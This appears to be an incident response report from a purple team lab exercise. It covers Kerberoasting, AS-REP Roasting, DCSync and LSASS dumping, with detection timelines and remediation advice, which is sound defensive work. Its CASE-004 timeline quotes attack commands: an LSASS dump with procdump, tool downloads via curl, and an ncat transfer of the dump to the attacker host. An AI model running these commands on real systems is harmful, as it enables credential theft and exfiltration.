@@ -1,0 +1,279 @@
+# Incident Response Report: CORPNET Active Directory Attack Simulation
+
+**Cases:** CASE-2026-001, CASE-2026-002, CASE-2026-003, CASE-2026-004
+**Report date:** 2026-10-30
+**Analyst:** Niko Lazur
+**Environment:** isolated lab network VMnet2 (192.168.100.0/24), domain `corpnet.local`
+**Nature of incidents:** controlled attack simulations (purple team exercise). No production systems or real user data.
+**Activity dates:** 2026-10-25 (CASE-001 to 003), 2026-10-28 (CASE-004)
+**Time reference:** UTC unless stated. Local time in source files is EET (UTC+2).
+
+---
+
+## 1. Executive Summary
+
+Four credential-access techniques were executed from one attacker host (`192.168.100.20`) against the lab domain and investigated from DC01 Security logs, Sysmon, Wazuh, Suricata and packet captures.
+
+| Case | Technique | Result for the attacker |
+|---|---|---|
+| 001 | Kerberoasting (T1558.003) | RC4 service ticket for `svc-backup` obtained twice |
+| 002 | AS-REP Roasting (T1558.004) | AS-REP hash for `j.melnyk` obtained (pre-authentication disabled) |
+| 003 | DCSync (T1003.006) | Password hashes and Kerberos keys of 7 domain accounts, including `krbtgt` and `Administrator` |
+| 004 | LSASS credential dumping (T1003.001) | 6 successful `procdump` dumps of LSASS on a workstation, one file exfiltrated (~49 KB flow) |
+
+**Key conclusions**
+
+1. Wazuh custom rules detected all four techniques roughly **1 second** after the triggering Windows event (0.9 to 1.2 s).
+2. Network detection was uneven. Suricata fired a custom signature only for Kerberoasting. AS-REP Roasting and DCSync produced no custom Suricata alert in the case windows.
+3. CASE-004 shows a real detection gap: rule 100205 produced no alert for the first two dumps (05:12:08 and 05:16:16). Sysmon Event ID 10 (ProcessAccess) is not present in the exported log, so detection depended on process and file events.
+4. CASE-003 is the highest-impact case. DCSync exposed the `krbtgt` hash, so in a real environment the whole domain would have to be treated as compromised.
+5. Evidence handling needs rework before the cases can be considered closed: the chain of custody is empty for CASE-002 to 004, investigation notes are empty in all cases, and several acquisition records contradict the files on disk (section 8).
+
+**Highest-priority recommendations:** restrict replication rights (`svc-monitor`), re-enable Kerberos pre-authentication for `j.melnyk`, remove RC4, protect LSASS (RunAsPPL, Credential Guard, ASR), block remote WMI/DCOM from non-admin hosts, fix detection rules 100203/100205, and synchronise clocks (a 79 s skew was observed in CASE-004).
+
+---
+
+## 2. Scope, Sources and Method
+
+**Assets (basis for identification)**
+
+| Asset | Address | Basis |
+|---|---|---|
+| DC01 | 192.168.100.1 | SMB/Kerberos/DRSUAPI server in pcaps; `DC01.corpnet.local` in SMB negotiate |
+| Attacker host | 192.168.100.20 | Source of all attack traffic in the four cases |
+| VICTIM workstation `WIN-MT4VSSDMUEM` | 192.168.100.100 | Sysmon/Security logs and Wazuh agent name (CASE-004) |
+| SENSOR (Wazuh manager, Suricata) | 192.168.100.10 | Agent traffic to port 1514 in pcap (assumed role) |
+
+**Sources:** DC01 Security `.evtx`, VICTIM Sysmon `.evtx`, Wazuh `alerts.json`/`archives.json` and per-event subsets, Suricata `eve.json`/`fast.log`, pcaps, tool output files (`krb_hashes.txt`, `asrep_hashes.txt`, `secretsdump.txt`, `lsass.dmp`).
+
+**Method**
+- Events from all sources were aligned on UTC. Where a source used EET it was converted (UTC = EET − 2 h).
+- In CASE-004 the VICTIM clock lagged the sensor by about 79 s from ~05:55 onward (matched on three independent event pairs). Normalised times are given on the sensor clock.
+- The logs for CASE-001 to 003 are the same files (identical SHA-256) and contain earlier test runs from 06:41 UTC. Each case is therefore scoped to its own time window (below).
+- Confidence: **High** (directly visible in logs), **Medium** (consistent correlation), **Low** (inference or unexplained).
+- SHA-256 of every collected file was recomputed and compared with the sums files and acquisition records.
+
+---
+
+## 3. CASE-2026-001: Kerberoasting
+
+**Window:** 2026-10-25 07:35:22 to 07:35:58 UTC | **Technique:** T1558.003 | **Confidence:** High
+
+**Summary.** From `192.168.100.20`, the account `j.melnyk` requested RC4-encrypted (0x17) service tickets for the SPN of `svc-backup` twice, 35 seconds apart.
+
+| Time (UTC) | Source | Event |
+|---|---|---|
+| 07:35:22.773 | DC01 Security | 4624 NTLM type 3 logon, `j.melnyk`, from .20 |
+| 07:35:22.790 | DC01 Security | 4768 TGT for `j.melnyk`, enc 0x17, PreAuthType 0 |
+| 07:35:22.818 | PCAP | TGS-REQ for `svc-backup`; TGS-REP 2 ms later |
+| 07:35:22.819 | DC01 Security | 4769 service ticket `svc-backup`, enc 0x17 |
+| 07:35:22 | Suricata | sid 1000001 "AD Possible Kerberoasting - Multiple TGS-REQ" (plus generic ET/SURICATA Kerberos alerts) |
+| 07:35:56.996 to 07:35:57.023 | DC01 Security | Repeat: 4624, 4768, 4769 for the same SPN |
+| 07:35:57 | Suricata | sid 1000001 |
+| 07:35:58.033 | Wazuh | Rule 100201 (level 10) "Possible Kerberoasting - RC4 TGS-REQ" |
+
+**Findings**
+- `svc-backup` has an SPN and is served with RC4, so its password is attackable offline. The collected `krb_hashes.txt` holds one TGS-REP hash. Whether it was cracked is not documented.
+- `j.melnyk` already had valid credentials at 07:35:22 (NTLM logon). In the log order this happens before the AS-REP Roasting of CASE-002 (see section 7.1).
+- The two 4768 events for `j.melnyk` show PreAuthType 0, which also matters for rule 100203 (CASE-002).
+
+**Detection:** Suricata 1000001 and Wazuh 100201 both fired. Wazuh latency from the second 4769 was 1.0 s.
+**Impact:** offline crackable credential for a service account. `svc-backup` hash later appears in the DCSync output (CASE-003).
+
+---
+
+## 4. CASE-2026-002: AS-REP Roasting
+
+**Window:** 2026-10-25 07:37:51 to 07:37:53 UTC | **Technique:** T1558.004 | **Confidence:** High
+
+**Summary.** The attacker sent three AS-REQ messages without pre-authentication data within 25 ms for `svc-backup`, `Administrator` and `j.melnyk`. Only `j.melnyk` received an AS-REP, which contained material crackable offline.
+
+| Time (UTC) | Source | Event |
+|---|---|---|
+| 2026-10-22 (tool log) | `valid_users.txt` | User enumeration against KDC 192.168.100.1:88: 3 of 7 names valid (`svc-backup`, `Administrator`, `j.melnyk`). Log timezone unknown |
+| 07:37:51.619 to .644 | PCAP | 3 AS-REQ (msg type 10) from .20 |
+| 07:37:51.643 | DC01 Security | 4768 for `j.melnyk`, PreAuthType 0, enc 0x17, success |
+| 07:37:51.645 | PCAP | AS-REP (msg type 11) for `j.melnyk` |
+| 07:37:51 | Suricata | Only generic alerts (ET GoldenPac, Kerberos weak encryption) |
+| 07:37:52.848 | Wazuh | Rule 100203 (level 10) "Possible AS-REP Roasting" |
+
+**Findings**
+- `j.melnyk` has Kerberos pre-authentication disabled (inferred from PreAuthType 0 and a successful AS-REP). The hash in `asrep_hashes.txt` is `$krb5asrep$23$` (RC4). Cracking is not documented.
+- Rule 100203 fired 13 times in the shared logs, starting at 06:41:12 together with rule 100201. Because the Kerberoasting runs also produce 4768 events with PreAuthType 0 for the same account (section 3), the rule likely cannot distinguish AS-REP Roasting from Kerberoasting activity (inference, alert-to-event matching not done for every run).
+- There is no custom Suricata alert for this technique.
+
+**Detection:** Wazuh only. Latency from 4768 was 1.2 s.
+**Impact:** credential exposure for `j.melnyk`, enabling the authenticated Kerberoasting seen in CASE-001.
+
+---
+
+## 5. CASE-2026-003: DCSync
+
+**Window:** 2026-10-25 07:38:53 to 07:38:55 UTC | **Technique:** T1003.006 | **Confidence:** High
+
+**Summary.** Using `svc-monitor`, the attacker replicated directory data from DC01 over DRSUAPI and dumped account secrets with `secretsdump`.
+
+| Time (UTC) | Source | Event |
+|---|---|---|
+| 07:38:53.855 and .953 | DC01 Security | 2x 4624 NTLM type 3, `svc-monitor`, from .20 |
+| 07:38:53 | Suricata | ET INFO NTLM session setup (2067085/86/87), .20 to DC01:445 |
+| 07:38:53.971 | PCAP | DRSUAPI DsBind request/response |
+| 07:38:53.974 | PCAP | DsGetDomainControllerInfo |
+| 07:38:53.982 to 07:38:54.129 | PCAP | Repeated DsGetNCChanges requests (exported CSV) |
+| 07:38:53.987 to 07:38:54.127 | DC01 Security | 21x 4662 by `svc-monitor`, AccessMask 0x100, GUIDs `1131f6aa-…` (Replicating Directory Changes) and `1131f6ad-…` (Replicating Directory Changes All) |
+| 07:38:55.018 to .331 | Wazuh | 21x rule 100204 (level 12) "Possible DCSync", one per 4662 |
+
+**Findings**
+- `svc-monitor` holds directory replication rights, which a service account should not have. This is a misconfiguration.
+- `secretsdump.txt` contains hashes and Kerberos keys for 7 accounts: `Administrator`, `Guest` (empty-password hash), `krbtgt`, `DC01$`, `svc-backup`, `j.melnyk`, `svc-monitor`.
+- No Suricata alert for DRSUAPI replication was found in the window (only generic NTLM info alerts). Whether a custom signature exists but did not match, or is not loaded, was not verified.
+
+**Detection:** Wazuh 100204 (21 of 21 events alerted, ~1.0 s after the first 4662).
+**Impact:** critical. Exposure of `krbtgt` allows Golden Ticket forgery. All listed accounts must be treated as compromised.
+
+---
+
+## 6. CASE-2026-004: LSASS Credential Dumping
+
+**Window:** 2026-10-28 05:09:19 to 06:02:34 UTC | **Techniques:** T1003.001, T1047, T1105, T1048.003 | **Confidence:** High for the chain, Medium for dump content
+**Detailed artefacts:** `CASE-2026-004-timeline.csv/.md`, `CASE-2026-004-iocs.csv`
+
+**Summary.** Two Impacket-style `wmiexec` sessions from `192.168.100.20` ran as the local account `WIN-MT4VSSDMUEM\Steve` (NTLM, type 3) after two failed logons. Commands were executed through `WmiPrvSE.exe` and output redirected to `\\127.0.0.1\ADMIN$\__<epoch>`. The attacker dumped LSASS with Sysinternals ProcDump, then fetched `ncat` and sent a dump to the attacker host.
+
+| Time (UTC, sensor clock) | Event |
+|---|---|
+| 05:09:19 | NTLM auth from .20 to DC01:445 (Suricata); logon failure on DC01 at 05:09:20 (Wazuh 60122) |
+| 05:09:35 and 05:10:01 | 2x 4625 for `Steve` (bad password) on VICTIM |
+| 05:10:14 | 5x 4624 for `Steve`, LogonId `0x133301`; first wmiexec command; Suricata WMIExec alert |
+| 05:10:42 and 05:11:10 | Failed dump attempts (`tasklist -dump`, `procdump` without PID), no file created |
+| 05:12:08 | **Dump #1** `procdump64 -ma 640` to `C:\lsass.exe.dmp`. No Wazuh alert |
+| 05:16:16 | **Dump #2**. No Wazuh alert |
+| 05:44:49 | **Dump #3** (SMB logon 05:44:49.274) |
+| 05:44:50.357 | First Wazuh rule 100205 alert (level 15) |
+| 05:45:59, 05:50:25 | Dumps #4 and #5 |
+| 05:54:52 | Session 1 closed (5 logoffs) |
+| 05:56:30 | Session 2 starts (NTLM to VICTIM:445, WMIExec alert 05:56:31) |
+| 05:59:43 to 05:59:44 | `curl` downloads `procdump64.exe` and `ncat.exe` from `http://192.168.100.20:8000/`; Suricata Python SimpleHTTP banner; Wazuh 92074 |
+| 06:00:59 | `certutil -dump C:\lsass.dmp` |
+| 06:01:30 | **Dump #6** written as `C:\lsass-2.dmp` |
+| 06:02:23 | `ncat.exe 192.168.100.20 9000 < C:\lsass.dmp`; Suricata flow VICTIM to .20:9000, 49,278 B to server |
+| 06:02:34 | Session 2 closed |
+
+**Findings**
+- 6 successful dumps and 2 failed attempts in about 50 minutes. Rule 100205 raised 4 alerts in the window, consistent with dumps #3 to #6. Dumps #1 and #2 went undetected. The cause was not verified (the Wazuh agent restarted at 05:36:53).
+- The ProcDump command uses the PID (`-ma 640`) and names the output `lsass.exe`, so a rule that matches the string "lsass" on the command line is bypassed by renaming the output file.
+- No Sysmon Event ID 10 against `lsass.exe` is present in the exported log.
+- The collected `lsass.dmp` is 46,818 bytes with a valid `MDMP` header. This size matches the exfiltration flow, but it is small for a full-memory dump. Its credential content was not analysed.
+- The exfiltration is visible in `eve.json` but not in `lsassA.pcap`, which contains no traffic from `192.168.100.20` at all.
+- Two items remain unexplained (Low confidence): a recurring `Steve` network logon every ~2 minutes from .20, and two 4648 explicit-credential events for `Administrator` at 05:14:17.
+
+**Detection:** Wazuh 100205 (partial), Suricata ET "Suspected Impacket WMIExec" (8 alerts), Wazuh 92074 on the `curl` download.
+**Impact:** LSASS memory of the workstation was copied off-host. Any credential present at 05:12 to 06:01 must be considered exposed once the dump is analysed.
+
+---
+
+## 7. Cross-Case Analysis
+
+### 7.1 Attack path versus evidence order
+
+The cases are numbered as a narrative (Kerberoasting, AS-REP, DCSync, LSASS), but the evidence shows separate runs of each technique, not one continuous intrusion. For example, `j.melnyk` authenticates in CASE-001 (07:35) before the AS-REP Roasting that exposes the same account (07:37). CASE-004 uses a local account and a different host. The report therefore treats the cases as independent exercises sharing one attacker host and toolset.
+
+### 7.2 Detection coverage
+
+| Technique | Wazuh custom | Suricata custom | Other |
+|---|---|---|---|
+| Kerberoasting | 100201 detected | 1000001 detected | Generic ET/SURICATA Kerberos alerts |
+| AS-REP Roasting | 100203 detected (low specificity) | none | Generic alerts only |
+| DCSync | 100204 detected (21/21) | none observed | NTLM info alerts only |
+| LSASS dump | 100205 partial (4 alerts, 6 dumps) | none | ET WMIExec (8), Wazuh 92074; Sysmon ID 10 absent |
+
+### 7.3 Time to detect (Wazuh)
+
+| Case | Triggering event | Alert | Delay |
+|---|---|---|---|
+| 001 | 4769 at 07:35:57.023 | 07:35:58.033 | 1.0 s |
+| 002 | 4768 at 07:37:51.643 | 07:37:52.848 | 1.2 s |
+| 003 | first 4662 at 07:38:53.987 | 07:38:55.018 | 1.0 s |
+| 004 | dump #3 at 05:44:49.413 | 05:44:50.357 | 0.9 s |
+
+### 7.4 Credential exposure
+
+| Account | Exposed through |
+|---|---|
+| `svc-backup` | TGS-REP hash (001), DCSync (003) |
+| `j.melnyk` | AS-REP hash (002), DCSync (003) |
+| `svc-monitor`, `Administrator`, `krbtgt`, `DC01$`, `Guest` | DCSync (003) |
+| `Steve` (local, VICTIM) | Used by the attacker (004); source of the credential unknown |
+| Accounts present in LSASS on VICTIM | Not determined (dump not analysed) |
+
+### 7.5 Common indicators
+
+`192.168.100.20` appears in all four cases. The Impacket toolset is indicated in CASE-003 (secretsdump output) and CASE-004 (wmiexec command pattern and Suricata signature). The tooling for CASE-001 and 002 cannot be identified from the evidence.
+
+---
+
+## 8. Evidence Handling and Documentation Findings
+
+All collected files were re-hashed. Every file matches its sums file, with one exception noted below.
+
+| Case | Finding | Required fix |
+|---|---|---|
+| All | `investigation_notes.md` empty in all four cases | Write analyst notes (this report can be the base) |
+| 002, 003, 004 | `chain_of_custody.txt` empty. CASE-001 has one entry (ID `E005-01`, does not match `acquisition.txt`) | Complete custody records |
+| 001 to 003 | `DC01-Security.evtx`, `eve.json`, `fast.log` are identical copies in each case and include runs from 06:41 UTC | Keep one shared source and record per-case time windows, or extract per-case subsets |
+| 001 | `E001-02` destination says CASE-002 and its description is copied from the evtx entry. `E-001-03` SHA-256 in `acquisition.txt` differs from the file (sums file matches). Evidence ID formats inconsistent (`E001-01`, `E-001-03`) | Correct fields, re-hash, unify ID format |
+| 001 | `timaestap-comparsion.csv` first row UTC 07:35:57 should be 07:35:22; field-dictionary lines at the top | Correct row and filename |
+| 002 | 4 of 5 acquisition entries show destination CASE-001. `E-002-04 asrep-alerts.json` does not exist (file is `event-4768-alerts.json`). Timestamp CSV mislabels AS-REQ/AS-REP as "AES-REQ/AES-REP" and the first row UTC is 07:35:51 instead of 07:37:51 | Correct destinations and names |
+| 003 | `E003-02/03` reference `rule-100204-*.json`, which do not exist (files are `event-4662-*`). `E003-02` destination CASE-002. Timestamp CSV copy-pasted from CASE-002: wrong pcap name, "AS-REP Roasting" notes, Wazuh row has original and UTC swapped | Rebuild the comparison file |
+| 004 | `E004-02` acquisition time 2026-10-25 predates the incident; `E004-01` time (05:50 UTC) is earlier than records inside the file (up to 21:15 UTC). Source labelled "DC01" but the host is `WIN-MT4VSSDMUEM`. `lsass.dmp` is not registered as evidence. Description names `C:\lsass.dmp` while Sysmon records `C:\lsass.exe.dmp`. Timestamp CSV UTC column is wrong (wrong dates and offset sign) | Correct times, host label and register the dump |
+
+---
+
+## 9. Recommendations
+
+| Priority | Action | Addresses |
+|---|---|---|
+| Critical | Reset passwords of all 7 DCSync accounts; reset `krbtgt` twice with the replication interval between resets; rebuild trust in tickets | 003 |
+| Critical | Remove replication rights from `svc-monitor`; audit who holds `Replicating Directory Changes (All)` | 003 |
+| Critical | Disable and rotate local account `Steve`; deploy LAPS for local administrators | 004 |
+| High | Re-enable Kerberos pre-authentication for `j.melnyk`; alert on any account with it disabled | 002 |
+| High | Move `svc-backup` to a gMSA or a 25+ character password; enforce AES and disable RC4 via GPO | 001, 002 |
+| High | Enable LSA protection (RunAsPPL), Credential Guard and the ASR rule "Block credential stealing from LSASS"; block ProcDump and `ncat` with WDAC/AppLocker | 004 |
+| High | Restrict remote WMI/DCOM and SMB admin shares to admin hosts; limit workstation outbound traffic | 004 |
+| High | Fix rule 100205: enable Sysmon ProcessAccess for `lsass.exe`, match `-ma` with PID and `GrantedAccess`, do not depend on the output filename | 004 |
+| Medium | Narrow rule 100203 (require absence of a preceding TGS context or exclude Kerberoasting TGT requests) and test it against CASE-001 data | 001, 002 |
+| Medium | Add Suricata signatures for AS-REP responses and DRSUAPI `DsGetNCChanges` from non-DC hosts; verify they load and match | 002, 003 |
+| Medium | Enforce NTP across all VMs (79 s skew seen); record the offset in each case | 004 |
+| Medium | Complete evidence records and custody entries (section 8); analyse `lsass.dmp` with `pypykatz` and list exposed account names | all |
+
+---
+
+## 10. Limitations
+
+- Password cracking results for the Kerberoasting and AS-REP hashes are not documented, so exposure is stated as "hash obtained", not "password recovered".
+- The content of `lsass.dmp` and the payload of the `ncat` transfer were not analysed or captured.
+- Alert-to-event matching was done for the case windows only. Earlier runs in the shared logs (from 06:41 UTC) were not analysed.
+- SENSOR role and the VM-to-IP mapping other than DC01 are inferred from traffic.
+- The Wazuh agent restart at 05:36:53 (CASE-004) may explain missed alerts for dumps #1 and #2, but this was not tested.
+
+---
+
+## Appendix A. MITRE ATT&CK Mapping
+
+| ID | Technique | Cases |
+|---|---|---|
+| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | 001 |
+| T1558.004 | Steal or Forge Kerberos Tickets: AS-REP Roasting | 002 |
+| T1003.006 | OS Credential Dumping: DCSync | 003 |
+| T1003.001 | OS Credential Dumping: LSASS Memory | 004 |
+| T1078.003 | Valid Accounts: Local Accounts | 004 |
+| T1110 | Brute Force (two failed logons, low confidence) | 004 |
+| T1047 | Windows Management Instrumentation | 004 |
+| T1057 | Process Discovery | 004 |
+| T1105 | Ingress Tool Transfer | 004 |
+| T1048.003 | Exfiltration Over Unencrypted Non-C2 Protocol | 004 |
+
+## Appendix B. Related Files
+
+- `CASE-2026-004-timeline.csv`, `CASE-2026-004-timeline.md`: event timeline with normalised UTC.
+- `CASE-2026-004-iocs.csv`: 25 indicators in the lab IOC schema.
